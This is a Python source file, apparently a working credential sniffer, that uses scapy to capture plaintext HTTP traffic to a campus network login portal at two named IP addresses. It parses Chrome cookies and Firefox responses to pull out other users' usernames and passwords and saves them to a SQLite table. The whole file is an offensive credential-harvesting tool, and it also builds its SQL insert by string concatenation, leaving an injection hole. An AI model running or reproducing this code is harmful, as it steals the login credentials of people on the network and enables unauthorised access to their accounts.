from scapy.all import *
import sqlite3

db = 'test.db'

chrome_success_flag = "/eportal/success.jsp"
firefox_success_flag = '"result":"success"'

chrome_user_id_flag = "EPORTAL_COOKIE_USERNAME"
chrome_password_flag = "EPORTAL_COOKIE_PASSWORD"

firefox_user_id_flag = "userId"
firefox_password_flag = "password"

filter = "tcp port 80 and host 121.251.251.217 or host 121.251.251.207"

def pack_callback(packet):
    data = str(packet.payload)
    existed_flag = 0
    user_id = ""
    user_password = ""

    if chrome_success_flag in data:
        splits = data.split(";")
        for i in range(0, len(splits)):
            if chrome_user_id_flag in splits[i]:
                user_id = splits[i].split("=")[1]
                user_password = splits[i + 1].split("=")[1]
    elif firefox_success_flag in data:
        splits = data.split(",")
        for i in range(0, len(splits)):
            if firefox_user_id_flag in splits[i]:
                user_id = splits[i].split('"')[3]
                user_password = splits[i + 1].split('"')[3]

    if user_id != "":
        try:
            cursor.execute('select * from campus_net_user')
            all_result = cursor.fetchall()
            for row in all_result:
                if user_id in row[1]:
                    existed_flag = 1
                    break
            if existed_flag == 0:
                insert_sql = 'insert into campus_net_user("user_id", "password") values("' + user_id + '","' + user_password + '")'
                print(insert_sql)
                cursor.execute(insert_sql)
                conn.commit()
        except sqlite3.Error as e:
            print(e)


if __name__ == "__main__":
    conn = sqlite3.connect(db)
    cursor = conn.cursor()
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table' and name='campus_net_user'; ")
    table_exists = cursor.fetchall()
    if not table_exists:
        cursor.execute('create table campus_net_user '
                       '(id INTEGER PRIMARY KEY autoincrement,'
                       'user_id varchar(20),'
                       'password varchar(50))')
    try:
        sniff(filter=filter, prn=pack_callback, count=0)
    except KeyboardInterrupt:
        conn.commit()
        cursor.close()
        conn.close()
